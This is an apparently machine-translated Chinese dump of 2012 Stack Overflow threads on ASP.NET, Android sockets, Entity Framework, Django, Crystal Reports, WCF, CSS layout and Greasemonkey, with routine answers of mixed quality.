这可能吗，或者我必须先调用 javaScript，然后页面上的 Javascript 将调用我的服务器端。（我认为这种方式服务器端代码中的方法必须是静态的）。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-18T21:46:36.160

您可以将不可见的 LinkBut​​ton 添加到您的页面（例如带有空白文本的 LinkBut​​ton），并从您的客户端`onKeyUp`事件调用 LinkBut​​ton 的`click()`方法并捕获`Click`事件服务器端。

要传递参数，您可以使用客户端和服务器端均可读取的任何控件，例如隐藏字段。

例如 - 您的 HTML 标记可能如下所示：

```
<asp:TextBox ID="xtxtMyText" runat="server" onkeyup="doMyPostback()"></asp:TextBox>
<asp:HiddenField ID="xhidParam" runat="server" />
<asp:LinkButton ID="xlnkMyPostBack" runat="server" OnClick="xlnkMyPostBack_Click"></asp:LinkButton>

<script type="text/javascript">

  function doMyPostback(e) {
      var evt = window.event ? window.event : e;

      if (evt.keyCode == 13) {
          document.getElementById('xhidParam').value = document.getElementById('xtxtMyText').value; 
          document.getElementById('xlnkMyPostBack').click()
      }
  }

</script> 
```

在这里，您有一个触发`keyUp`事件的文本框、一个导致服务器端`Click`事件的隐藏链接按钮和一个用于传递参数的隐藏字段。在这种情况下，如果用户按 Enter 键，文本框的内容将被复制到隐藏变量并单击链接按钮。

在服务器端，您可以处理该事件并从隐藏字段中读取传递的参数，例如

```
protected void xlnkMyPostBack_Click(object sender, System.EventArgs e)
{
    Response.Write(xhidParam.Value);
} 
```

# java - Android 手机上的套接字连接超时

> ID：11091325
> 
> 赞同：4
> 
> 时间：2012-06-18T21:25:34.297
> 
> 标签：java, android, sockets, client

我正在尝试做一些服务器/套接字编程。服务器代码是在 Ubuntu 机器上用纯 Java 编写的。客户端代码是为我的 LG Thrill 编写的。服务器似乎工作正常。我已经通过在普通 java 中编写一个简单的测试客户端来测试服务器，该客户端基本上使用带有“localhost”ip 的 try/catch 块。我通过从我的手机 ssh 进入服务器机器检查了该 ip 是否可以访问（是的，它是可以访问的）。

我的服务器代码如下所示：

```
package org.vsector.server;

import java.io.IOException;
import java.net.ServerSocket;

public class SceneFlowServer {

    int port;
    Thread running = null;
    CameraHandler handler = null;

    public SceneFlowServer( int port, CameraHandler handler ){

        this.port = port;
        this.handler = handler;

    }

    public void start(){

        if( handler == null ) return;

        try{

            running = new Thread(){

                public void run(){

                    try{

                        ServerSocket listen = new ServerSocket( port );
                        while( true ){

                            System.out.print( "I am waiting on port " + port + "... " );
                            handler.accept( listen.accept() );
                            System.out.println( "Got someone!" );
                            Thread spinoff = new Thread( handler );
                            spinoff.start();

                        }

                    }catch( IOException e ){

                        System.err.println( "Could not listen on port " + port + "!" );
                        System.err.flush();
                        return;

                    }

                }

            };
            running.start();
            running.join();

        }catch( Exception e ){

            System.err.println( "Could not start thread!" );
            System.err.flush();

        }

    }

} 
```

我的 CameraHandler 代码：

```
package org.vsector.server;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.Socket;

public class CameraHandler implements Runnable {

    Socket client = null;

    public CameraHandler(){ }

    public void accept( Socket client ){

        this.client = client;

    }

    @Override
    public void run() {
        // TODO Auto-generated method stub

        BufferedReader in;
        try {
            in = new BufferedReader( new InputStreamReader( client.getInputStream() ));
            System.out.println( in.readLine() );
        } catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }

        try {
            client.close();
        } catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }

    }

} 
```

我的客户端代码如下所示：

```
package org.vsector.client;

import java.io.PrintWriter;
import java.net.InetSocketAddress;
import java.net.Socket;

import android.app.Activity;
import android.os.Bundle;
import android.widget.TextView;

public class ProcessingClientActivity extends Activity {
    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        TextView text = (TextView) findViewById( R.id.textBox );

        Socket sock;
        try {
            text.append( "\nOpening and writing to socket... " );
            sock = new Socket();
            sock.connect( new InetSocketAddress( "some ip", 4444 ), 30000 );
            PrintWriter out = new PrintWriter( sock.getOutputStream(), true );
            out.println( "Hello!" );
            out.close();
            sock.close();
            text.append( "Done!" );
        } catch (Exception e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
            text.append( "Error: " + e + "\n" );
            text.append( e.getMessage() );
        } 

    }
} 
```

设置了权限，但这仍然会导致“错误：java.net.SocketTimeoutException：连接超时”。

我不知道是什么原因造成的！有任何想法吗？

编辑：

没关系。网络问题。我在我的家庭网络上运行了代码，一切正常。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-18T21:34:37.043

老兄，尝试在它们之间添加flush（）：

```
out.println( "Hello!" );
out.flush();  //add this line
out.close(); 
```

您可能正在关闭套接字以快速..

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-27T16:39:29.387

代码没有实际问题，但我所在的网络的一切。

在我搬到我的家庭网络后，一切正常。

# c# - 实体框架代码第一个错误“错误定位服务器/指定的实例”

> ID：11091328
> 
> 赞同：13
> 
> 时间：2012-06-18T21:25:48.077
> 
> 标签：c#, entity-framework-4.1, ef-code-first

我正在尝试将 Code First 与我的本地 Sql Server 2008 R2 实例一起使用。我创建了一个用户'dev'，可以使用 Sql Managment Studio 登录和创建数据库。问题是我在尝试使用 EntityFramework 中的 DbContext 创建数据库时不断收到错误消息。这是错误消息：

> “在建立与 SQL Server 的连接时发生与网络相关或特定于实例的错误。找不到服务器或无法访问该服务器。验证实例名称是否正确以及 SQL Server 是否配置为允许远程连接。SQL 网络接口，错误：26 - 错误定位服务器/实例指定“

我检查了我的 Sql Server 的错误消息，它确实允许远程连接。

我用以下代码抽象了我的系统并得到了同样的错误：

```
namespace CodeFirstConsole
{
    public class Program
    {
        static void Main(string[] args)
        {
            var db = new MyContext();
            try { Console.WriteLine(db.Parents.Count()); }
            catch (Exception) { throw; }
            Console.Read();
        }
    }

    internal class MyContext : DbContext
    {
        public DbSet<ParentObject> Parents { get; set; }
        public DbSet<ChildObject> Children { get; set; }

        public MyContext()
        {
            this.Database.Connection.ConnectionString =
                "Data Source=.;Database=ConsoleTest;Initial Catalog=ConsoleTest;User ID=dev;Password=dev;";
        }
    }

    internal class ParentObject
    {
        public int Id { get; set; }
        public string PropertyOne { get; set; }
    }

    internal class ChildObject
    {
        public int Id { get; set; }
        public bool PropertyOne { get; set; }
        public string PropertyTwo { get; set; }

        public virtual ParentObject Parent { get; set; }
    }

    internal class MyInitializer : DropCreateDatabaseAlways<MyContext>
    {

        protected override void Seed(MyContext context)
        {
            context.Parents.Add(new ParentObject() { PropertyOne = "hi" });
            base.Seed(context);
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：25
> 
> 时间：2012-11-20T03:28:25.540

我遇到了同样的错误，让我发疯了大约一天。我的情况是我有一个大型解决方案，其中包含一个预先存在的启动项目，并且我正在将 EF 添加到持久性项目中。

所以第一步是添加EF依赖。这在我的持久性项目中创建了一个具有正确 EF 内容的 app.config。然后我去了 Enable-Migrations 并在这篇文章中遇到了同样的错误。在这一点上，我没有想到将 EF app.config 设置复制到启动项目的 app.config 中，因为我认为在最终运行应用程序之前必须先尝试一下。

当我将解决方案启动项目更改为持久性项目时，问题得到解决，因此我可以让 EF 找到正确的 app.config。或者我可以将 EntityFramwework 相关部分复制到启动项目的 app.config 中。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2016-05-13T10:05:35.140

在本地开发了相同的错误消息，但昨天运行良好。原来解决方案中的错误项目被设置为启动项目。

因此，如果您在 Package Manager Console 中的 update-database 命令后也收到此消息，请务必检查是否设置了正确的 StartUp Project。

例如 Web 项目，而不是辅助项目之一。Visual Studio 似乎有将其他项目设置为 StartUp 的习惯，有时...

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-18T22:02:20.547

尝试在这里查看它解释了很多原因，因为您在评论中指出您确实明确指定了服务器名称，并且代码也与 sql server 在同一台机器上运行，因为从我看到的数据源只有一个点，表明它与运行的 c# 代码程序是同一台机器。

[http://blogs.msdn.com/b/sql_protocols/archive/2007/05/13/sql-network-interfaces-error-26-error-locating-server-instance-specified.aspx](http://blogs.msdn.com/b/sql_protocols/archive/2007/05/13/sql-network-interfaces-error-26-error-locating-server-instance-specified.aspx)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-02-05T14:59:23.167

这是我的解决方案 [传统 SqlClient 可以找到服务器实例但 EF 不能](https://stackoverflow.com/questions/26263852/traditional-sqlclient-can-find-server-instance-but-ef-cant)

简而言之：

```
Database.SetInitializer<MyContext>(
new MigrateDatabaseToLatestVersion<MyContext, Migrations.Configuration>(
    useSuppliedContext: true)); 
```

这里的主要部分是**useSuppledContext: true**

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2016-01-13T13:58:12.027

还必须将 EntityFramework 依赖项添加到启动项目中。

```
Install-Package EntityFramework 
```

并且还必须定义`connectionStrings`到我的主项目 App.config/Web.config。

```
<connectionStrings>
    <add name="Database" providerName="System.Data.SqlClient" connectionString="foo.bar" />
</connectionStrings> 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2018-01-22T09:02:38.227

我遇到了同样的问题，花了一整天的时间。终于找到@Christian 的答案，现在我找到了更好的方法！

放入`ConnectionString`启动项目。因此，您无需在每次更改实体时都进行切换。

# c# - HtmlAgilityPack 从页面中的所有 div 中提取文本，而不仅仅是从代码中指定的一个 div 中提取文本

> ID：11091329
> 
> 赞同：0
> 
> 时间：2012-06-18T21:25:50.440
> 
> 标签：c#, html-agility-pack

我对带有 HtmlAgilityPack 的 xpath 表达式有一个奇怪的行为。我正在尝试使用 HtmlAgilityPack 来提取声明为的 div 中的所有值 `<div class='cont'>`但是，当我使用下面的代码时，我只需获取 `<div class='cont'>`AND中的所有值`<div class='button'>`。有谁知道为什么会这样？这是重现它的完整代码：

```
using System;
using System.Xml.XPath;
using HtmlAgilityPack;

namespace ConsoleApplication1
{
    class Program
    {
        static void Main(string[] args)
        {
            const string text1 = @"<div class=""cont"">
<h3>content</h3> 
<div style=""margin: 0cm 0cm 0pt"" class=""Normal"">content1</div><div style=""margin: 0cm 0cm 0pt"" class=""Normal""> content2</div>
<div style=""margin: 0cm 0cm 0pt"" class=""Normal"">content3 </div>
<div>content4 </div><strong>content5
<div>content6 </div><ul type=""disc"">    
<div>content7 </div>        
<div>content8 </div>    </ul>
<p class='margin10'><font size=""2"">
<div>
<p><span style=""font-family: Arial"">content9</span></p>
</div>
<div>content10</font><a href=""mailto:james@polis.com""><u><font color=""#0000ff"" size=""2""><font color=""#0000ff"" size=""2""> content11 </u></font></font></a><font size=""2""> content12
<div>content13</div>
</div>
</font>
</p>
</div>
<div class=""button"">
<span class=""applybtn""><a class=""buttonGlobal buttonAlpha"" href=""/uk/job/apply/(id)/608735"">content14</a></span>
</div>";
            foreach (XPathNavigator node in SearchInPage(text1, "//div[@class='cont']"))
            {
                Console.WriteLine("option " + node.Value);
            }

        }

        private static XPathNodeIterator SearchInPage(string text, string xpath)
        {
            HtmlDocument htmlDocument = new HtmlDocument();
            htmlDocument.LoadHtml(text);
            XPathNavigator xpathNavigator = htmlDocument.CreateNavigator();
            XPathNodeIterator nodes = xpathNavigator.Select(xpath);
            return nodes;
        }
    }
} 
```

代码返回：'content', 'content1-13' PLUS 'content14' 存在于 `<div class='button'>`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-26T17:59:48.433

因此，如果我理解正确，您只想找到 node 的子节点的值`<div class="cont">`吗？

尝试这个：

```
HtmlDocument doc = new HtmlDocument;
doc.Load(Html);
HtmlNode node = doc.DocumentNode.SelectSingleNode(".//div[@class='cont']");

foreach(HtmlNode childNode in node)
{
    Console.WriteLine(childNode.Value);
} 
```

我没有办法在我面前调试它，但这应该可以。应该只选择`(".//div[@class='cont']")`指定节点及其子节点，并忽略位于指定节点之外的任何内容。剩下的只是 Linq 和 HtmlAgilityPack - 请记住，HtmlAgilityPack 实现了 XPath，因此请确保在使用 XPath 之前查看 AgilityPacks 可用的方法......请记住，xml 和 html 是不同的语言，适用于一个的不一定适用于其他。

# django - 异常值：blog() 正好接受 2 个参数（1 个给定）

> ID：11091330
> 
> 赞同：0
> 
> 时间：2012-06-18T21:25:53.333
> 
> 标签：django, django-models, django-templates, django-views

几天来，我一直在努力在 Django 中设置视图/网址。努力让我的头脑围绕它每个人似乎都略有不同。

我想要实现的是：

我想有一个博客，我可以在该网站上发布新闻帖子，该网站将位于示例 - mysite.com/blog/ 然后您可以点击查看单独的帖子，它会从每个帖子中拉出蛞蝓。（这非常有效）。

但是我想从博客应用程序中提取帖子，以便主页。因此，您可以查看最新帖子的片段。我现在明白我需要在 app 文件夹之外和主目录中创建一个视图和一个 URL。但是我正在努力让他们联系在一起。我目前收到上面显示的错误消息。“没有博客与给定的查询匹配。” 这是我的 URL、模型和 2 个不同视图文件夹的代码。

```
//URLS for app and main directory

import authority
from django.conf import settings
from django.conf.urls import patterns, include, url
from django.conf.urls.defaults import url, include, patterns
from django.contrib import admin

admin.autodiscover()
authority.autodiscover()

urlpatterns = patterns('',
    url(r'^admin/doc/', include('django.contrib.admindocs.urls')),
    (r'^authority/', include('authority.urls')),
    (r'^i18n/', include('django.conf.urls.i18n')),
    (r'^admin/', include(admin.site.urls)),

    url(r'^$', 'views.blog', name='index'),
    url(r'^blog/(?P<slug>[-\w]+)/$', 'blog.views.blog', name="blog"),
    url(r'^blog/$', 'blog.views.blog_index', name="blog_index"),
)

if settings.DEBUG:
    urlpatterns += patterns('',
        # Trick for Django to support static files (security hole: only for Dev environement! remove this on Prod!!!)
        url(r'^admin/pages/page(?P<path>.*)$', 'django.views.static.serve', {'document_root': settings.PAGES_MEDIA_ROOT}),
        url(r'^media/(?P<path>.*)$', 'django.views.static.serve', {'document_root': settings.MEDIA_ROOT}),
        url(r'^admin_media/(?P<path>.*)$', 'django.views.static.serve', {'document_root': settings.ADMIN_MEDIA_ROOT}),
    )

urlpatterns += patterns('',      
    (r'^', include('pages.urls')),
    ) 
```

//主页的主视图

```
 from django.http import HttpResponse
    from django.shortcuts import render_to_response, get_object_or_404
    from django.template import RequestContext

from blog.models import Blog, NewsPost

def blog_index(request):
blogs = Blog.objects.filter(active=True)

return render_to_response('index.html', {
    'blogs':blogs,
}, context_instance=RequestContext(request)) 
```

//博客应用的浏览量

```
from django.http import HttpResponse
from django.shortcuts import render_to_response, get_object_or_404
from django.template import RequestContext

from blog.models import Blog, NewsPost

def blog_index(request):
    blogs = Blog.objects.filter(active=True)

    return render_to_response('blog/index.html', {
        'blogs':blogs,
    }, context_instance=RequestContext(request))

def blog(request, slug):
    blog = get_object_or_404(Blog, active=True, slug=slug)

    return render_to_response('blog/blog_post.html', {
        'blog': blog
    }, context_instance=RequestContext(request)) 
```

//来自博客应用程序的模型

```
from django.contrib.auth.models import User

 class TimeStampedActivate(models.Model):
        created = models.DateTimeField(auto_now_add=True)
        modified = models.DateTimeField(auto_now=True)
        active = models.BooleanField(default=False, help_text="Controls 
        whether or now this news post is live")

    class Meta:
        abstract = True

class Blog(TimeStampedActivate):
    title = models.CharField(max_length=255, help_text="Can be 
    anything up to 255 character")
    slug = models.SlugField()
    description = models.TextField(blank=True, help_text="Give a short 
    description of the news post")
    content = models.TextField(blank=True, help_text="This is the main 
    content for the news post")
    user = models.ForeignKey(User, related_name="blog")

    def __unicode__(self):
        return self.title

    @models.permalink
    def get_absolute_url(self):
        return ('blog', (), {
            'slug': self.slug
        })

class NewsPost(TimeStampedActivate):
    title = models.CharField(max_length=255, help_text="title of the post")
    slug = models.SlugField()
    description = models.TextField(blank=True, help_text="Give a short 
    description of the news post")
    content = models.TextField(blank=True, help_text="This is the main 
    content for the news post")
    publish_at = models.DateTimeField(default=datetime.datetime.now(),
    help_text="Choose when the post is visible")

    blog = models.ForeignKey(Blog, related_name="posts")

    def __unicode__(self):
        return self.title

    class Meta:
        ordering = ['-publish_at', '-modified', '-created'] 
```

如果您需要更多信息，请随时询问！我对这一切都很陌生，所以放轻松！：） 提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-18T22:25:38.227

改变

```
url(r'$', blog), 
```

至

```
url(r'$', 'views.blog_index', name='index'), 
```

或者写一个单独的视图。

您收到错误的原因是因为您正在尝试执行需要标题页中`blog`的 a 的功能。`slug`您想要做的是`index`从您的标题页中显示不带`slug`.

此外，以下内容会引起您的痛苦：

```
from blog.views import blog_index, blog
from views import blog_index 
```

`blog_index`你想用哪个？您最好`'views.blog_index'`在 URL 中使用符号。`blog/`删除上面的那些导入，并且只在你的 URL 中使用基于字符串的视图名称，就像你对和所做的那样`blog_index/`。

编辑：这是您的整个 URL 应显示的内容（以使其正常工作..）

```
import authority
from django.conf import settings
from django.conf.urls import patterns, include, url
from django.conf.urls.defaults import url, include, patterns
from django.contrib import admin

admin.autodiscover()
authority.autodiscover()

urlpatterns = patterns('',
    url(r'^admin/doc/', include('django.contrib.admindocs.urls')),
    (r'^authority/', include('authority.urls')),
    (r'^i18n/', include('django.conf.urls.i18n')),
    (r'^admin/', include(admin.site.urls)),

    url(r'^$', 'views.blog', name='index'),
    url(r'^blog/(?P<slug>[-\w]+)/$', 'blog.views.blog', name="blog"),
    url(r'^blog/$', 'blog.views.blog_index', name="blog_index"),
)

if settings.DEBUG:
    urlpatterns += patterns('',
        # Trick for Django to support static files (security hole: only for Dev environement! remove this on Prod!!!)
        url(r'^admin/pages/page(?P<path>.*)$', 'django.views.static.serve', {'document_root': settings.PAGES_MEDIA_ROOT}),
        url(r'^media/(?P<path>.*)$', 'django.views.static.serve', {'document_root': settings.MEDIA_ROOT}),
        url(r'^admin_media/(?P<path>.*)$', 'django.views.static.serve', {'document_root': settings.ADMIN_MEDIA_ROOT}),
    )

urlpatterns += patterns('',      
    (r'^', include('pages.urls')),
    ) 
```

# crystal-reports - 在 Crystal Reports 中对详细信息进行分组

> ID：11091331
> 
> 赞同：0
> 
> 时间：2012-06-18T21:25:58.507
> 
> 标签：crystal-reports, report

我对水晶报表不太熟悉。我面临一个关于水晶报表中的详细信息字段的问题。

假设我在详细信息带中有 5 个字段。

字段 a、b、c、d、e 和以下字段的记录集如下

```
 A             B            C           D           E
   111            1            20         30          222
   111            1            21         31          222
   111            1            22         32          222
   111            2            11         11          222
   111            2            12         12          222
   111            2            13         13          222 
```

现在我需要通过对字段 B 进行分组来显示详细信息并获得 C 和 D 的总和。最后我的结果应该如下所示

```
 A             B            C           D           E
   111            1            20          30         222
                               21          31          
                               22          32  
                            -------      ------
                     Total     63          93

   111            2            11          11         222
                               12          12 
                               13          13         
                            -------      ------
                     Total     36          36 
```

有人可以帮我怎么做这种东西。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-19T00:30:20.163

您应该使用组选项（插入 --> 组）并选择字段 B。

然后，使用运行总计对所需字段求和。（查看-> 字段资源管理器，然后在字段资源管理器上右键单击“运行总字段”-> 新建）。使用此专家创建所需的运行总计，然后将其拖到您的报告中以显示它。

根据需要为组标题和“总计”的标题插入文本框。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-03-04T11:35:22.750

Urik is correct !

I just want to add some points as par the output user1464855 want.

1.  Add groups for two columns field A , field B . add these fields in the detail section also add the C, D and E in the section.
2.  To display Total you can use either of the following ways a. you can add new "Running Total field" for Columns C and Column D as Urik said. b. you can right click on the field "C" and select "Insert --> Summary" then select the field "C" select the "sum" and select the summary location "Group # 2" in "Insert Summary" dialoge box and click "OK".
3.  To avoid displaying the duplicate values (repeatation of values) select the field on the report e.g. field "E" right click on it Select "Format field" select "Common" Tab select check box "SUppress of Duplicated". you can repetae this step for other fields A, B.

I hope this will help you. kindly correct me if I am wrong !

# objective-c - 不调用 SPPlaylist 上的回调

> ID：11091332
> 
> 赞同：1
> 
> 时间：2012-06-18T21:25:59.063
> 
> 标签：objective-c, cocoa, cocoalibspotify-2.0

我在接收播放列表上的更改（添加、删除和移动的曲目）时遇到问题。

我有以下流程：

*   创建 SPSession
*   登录
*   从 URI 创建播放列表

然后我通过添加、删除和移动一些曲目来更改 Spotify 桌面应用程序中的播放列表。通过我的 SPPlaylistDelegate 上的回调通知正好 2 个更改。但随后它停止了。不再通知播放列表中的任何更改。这在旧版本的 CocoaLibSpotify 上运行良好。

谁能帮我解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-19T08:53:08.933

没有代码，我无法真正具体回答，但有几点需要注意：

首先，简单的东西：

1) 这是否发生在示例应用程序中？2) 你是否对播放列表保持强烈的引用，以免它被释放？

更先进：

3) 你确定事件没有被合并成一个包含多个动作的变化吗？4) 您是否正在检查`items`播放列表的属性——它们是否同步？5）您等待更改多长时间？他们可能需要一段时间才能完成——仅仅因为一个事件是立即发生的，并不意味着下一个事件将会发生。

但我真的需要看一些代码来正确回答这个问题。

# .net - WCF REST API 返回类型 .net 应用程序

> ID：11091337
> 
> 赞同：0
> 
> 时间：2012-06-18T21:26:18.840
> 
> 标签：.net, wcf, api, rest, int

我有一个 API 可以返回多个我事先不知道的东西，所以我必须把它作为 return type `System.Object`。

我对某些类型有一些问题。就像当它返回不同的对象时它很好但是当它返回时它`System.Int32`不起作用并告诉我：

```
Cannot serialize parameter of type 'System.Int32' because it is not the exact type 'System.Object' in the method signature and is not in the known types collection. 
```

任何想法 ？

我知道我们可以使用 ServiceKnownType 但我想知道是否有其他方法可以做到这一点？我需要这个...中的所有现有类型（int、bool、string 等）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-18T21:57:00.993

不要在服务合同上返回 System.Object 类型，即使它是 WCF 4 REST。默认序列化程序/格式化程序如何为您的合同产生响应。

您可以返回字节数组，将您的 System.Object 转换为字符串并返回它。无论如何，您始终可以将对象序列化为 XML 或 JSON 并以字符串形式返回。

还可以链接到具有相同问题的论坛，也许它可以帮助您： [http ://social.msdn.microsoft.com/Forums/nl-NL/wcf/thread/1f43e9b4-39a4-481b-88f0-18c7d4416745](http://social.msdn.microsoft.com/Forums/nl-NL/wcf/thread/1f43e9b4-39a4-481b-88f0-18c7d4416745)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-18T21:50:41.263

您可以创建一个简单的 if 语句来检查它是否为 int，然后您可以将其转换为对象。顺便说一句，整数不能成为对象，直到它们是一个字符串，所以如果我这样做，我会做一个简单的：

```
blah.toString(); 
```

并且 bam 你现在可以将它用作对象。

# html - 移动设备上的页面布局中断问题（或调整窗口大小时）

> ID：11091338
> 
> 赞同：0
> 
> 时间：2012-06-18T21:26:21.060
> 
> 标签：html, css, layout, mobile

在移动设备（至少包括 iPhone 4S 和 Galaxy Nexus）上查看网页时（位于[http://launchpadtoys.com/monkeygram/ ）出现问题。](http://launchpadtoys.com/monkeygram/)该页面在主要的桌面浏览器中正确呈现，所以我不确定解决方案可能是什么。这是我遇到的问题：http: [//i.imgur.com/uggr0.png](http://i.imgur.com/uggr0.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-18T23:50:46.683

尝试`<meta name="viewport" content="width=device-width" />`在页面的头部添加。

# javascript - Firefox中的神秘空白

> ID：11091341
> 
> 赞同：2
> 
> 时间：2012-06-18T21:26:42.083
> 
> 标签：javascript, html, css, firefox

在我的 Firefox 站点右侧有一个神秘的空白（在 PC 和 Mac 上，最新版本），我终其一生都无法弄清楚是什么原因造成的。

这是它的样子——![在此处输入图像描述](../Images/308e5b5515692647d0a88050ca9a3c61.png)

我已经搜索 CSS 很久了，现在试图弄清楚它是否是一些边距或填充问题，但我找不到任何东西。此外，如果我删除 div ID 'slider3'，问题似乎消失了，但我无法弄清楚这个 div 是如何导致空白的，因为它没有应用 CSS - 它只是一个容器。

这是我的网站[http://www.simplerweb.co.uk](http://www.simplerweb.co.uk)

这是一些相关代码，因此答案对以后的人们有用。

```
<div class="fullw">
<div class="sliderleft"></div>
<div class="sliderright"></div>

            <div id="slider3">
                <div class="quote">

                <div class="centmid">
                    <h1 class="fronth">Hello</h1>   
                    <h2 class="frontp">Welcome to Simpler Web</h2>
                    <h2 class="frontp2">We're an Edinburgh based Web<br> Design Agency</h2>
                </div><!-- end div centmid -->

                                </div> <!-- end div quotes1 -->
                <div class="quote2">
                <div class="centmid">
                    <h2 class="frontb">We make wonderful, cross platform <br> accessible Websites </h2>
                </div> <!-- end div centmid -->
                </div> <!-- end div quotes2 -->

                <div class="quote3">
                <div class="centmid">
                <h2 class="frontc">We can translate your ideas into reality </h2>
                </div> <!-- end div centmid -->
                </div><!-- end div quotes3 -->

            </div> <!-- #slider3 -->

</div> 
```

CSS

/* 以下样式对于滑块的功能是必不可少的 */

```
.plusslider {
    overflow: hidden;

    position: relative;
    padding-top: 140px; /* The height / width of the slider should never be set via the CSS. The padding increases the slider box-model while keeping it dynamic */
}

.plusslider-container { position: relative; }

/* Slides must have a set width - even though they may be dynamic. If no width is set on <img> slides, the default image size will be assumed */
div.child { width: 480px; }

.plusslider .child { float: left; }

/* PlusFader Specific (not needed with plustype:slider */
.plustype-fader .child { display: none; position: absolute; left: 0; top: 0; }
.plustype-fader .current { z-index: 5; }
/* End PlusFader Specific */

/* No-javascript fallback -- change "#slider" and "#slider2" identifiers as needed for your html */
#slider > * { display: none; }
#slider > *:first-child, #slider2 > *:first-child { display: block; }
/* End no-javascript fallback */ 
```

/* 结束基本样式*/

/* 以下样式对于滑块功能不是必需的。它们特定于示例内容。请务必注意，淡化效果不适用于非图像内容，除非该内容区域具有纯色背景（背景图像或背景颜色，但不透明）。

```
Slides to not have to be the same width or height, but if you'd like a consistent width and/or height, make sure to set that within the CSS! */
#slider .slide1 { padding-left: 40px; padding-right: 40px; margin-left: 0; margin-right: 0; } 
#slider .slide1 { height: 210px; padding-top: 20px; padding-bottom: 20px; margin-top: 0; margin-bottom: 0; } 

.slide1 {  height: 500px; padding: 20px 40px; }
.slide1 h2 { color: #fff; font-size: 20px; margin: 0 0 20px 0; text-align: left; }
.slide1 p { border-left: 3px solid #fff; color: #fff; padding: 0 0 0 10px; }

.quote, .quote2, .quote3 { height:400px; padding: 20px 0; width: 980px;   width: 100%; position: relative; }
.quote { background-image: url(../images/weare.png); background-position: center; background-repeat: no-repeat; }
.quote2 { background-image: url(../images/headlogosandroid.png); background-position: center; background-repeat: no-repeat; }
.quote3 { background-image: url(../images/ideafront.png); background-position: center; background-repeat: no-repeat; }

.plusslider a img { border: none; } /* Prevent blue borders in IE (not only does it look ugly, but it messes up spacing which breaks the "slider" type */

.plusslider-pagination { position: absolute; left: 0; bottom: 0; }
.plusslider-pagination li { float: left; list-style: none; margin-left: 5px; }

#slider3 {margin: 0; padding: 0;} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-18T21:45:20.520

您（在 FF 中）正好有**17px**的额外宽度，这正是浏览器滚动条的宽度。

您的开始（初始）*加载黑屏*（动画）留下了 17px 的故障：
因为它的动画保持 DOM 宽度等于`screen width`没有右滚动条（100% 屏幕宽度）。
在页面完全加载并将滚动条添加到页面后，它实际上添加了由*加载*动画维护的**额外**17px（到 100%）宽度。

 *希望我把你引向正确的方向。

顺便说一句，尝试添加：

```
html {
   overflow-y: scroll;
} 
```

并且 - 如果仍然需要 -如前所述调整*加载元素的宽度。*

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-18T22:00:53.750

添加这个：

```
body{
    overflow-x: hidden;
} 
```

问题解决了。（暂时地）

* * *

## 那么问题出在哪里？

它在你`<div>`的课堂`plusslider slider3 plustype-slider`上。您不断为其设置不正确的宽度。您必须减去滚动条宽度。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-19T14:02:14.600

您也可以尝试这样做：填充：0px（或其他）17px；和边距：0px（或其他）-17px；现在你两边的空白已经消失了。*

# javascript - 如何仅在表格中进行greasemonkey搜索

> ID：11091351
> 
> 赞同：1
> 
> 时间：2012-06-18T21:28:00.873
> 
> 标签：javascript, greasemonkey

下面是我的代码，目前它搜索整个网页。我试图弄清楚如何让它只在一个表中搜索。（页面上只有一个表格）。

任何帮助，将不胜感激。

```
var TargetLink              = $("a:contains('gg')");
var TargetSink              = $("a:contains('u')");

if (TargetLink  &&  TargetLink.length)
{
window.location.href    = TargetLink[0].href;
} 
else if (TargetSink  &&  TargetSink.length) 
{
window.location.href    = TargetSink[0].href;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-18T21:29:28.000

```
var TargetLink              = $("table a:contains('gg')");
var TargetSink              = $("table a:contains('u')"); 
```

**编辑：** 你说页面上只有一张桌子。你绝对知道永远只有一张桌子吗？即使您认为答案是肯定的，我也会尝试添加一个 id 或 class 选择器，以便将来不会出现问题。

此外，可以简化以下代码：

```
if (TargetLink  &&  TargetLink.length) 
```

到：

```
if (TargetLink.length) 
```

* * *

回复`"could I combine those 2 variables into 1"`：：

在选择器中使用逗号，如下所示：

```
//--- Need more of the HTML structure for a better selector.
var TargetLink              = $("table")
                            .find ("a:contains('gg'), a:contains('u')")
                            ;
if (TargetLink.length) {
    window.location.href    = TargetLink[0].href;
} 
```

如果找到两种链接，`'gg'`将使用（首先）。

# android - listview回收奇怪的空白空间

> ID：11091355
> 
> 赞同：2
> 
> 时间：2012-06-18T21:28:15.117
> 
> 标签：android, listview, listadapter, recycle

我有一个与这个问题类似的问题：[ListView and rows回收问题](https://stackoverflow.com/questions/5766907/listview-and-rows-recycling-problem)

以上解决。但同样的解决方案对我不起作用。

我有一个由文本视图组成的列表视图。每个文本视图可以包含可变数量的图像。我正在使用 html.imagegetter 获取图像，并且在列表适配器的 getview 方法中使用回收。

如果 textview 中有一个或多个图像，它的高度将能够适应其内容。当这个textview被回收并且新的内容没有填满之前定义的高度时，就会出现空白。

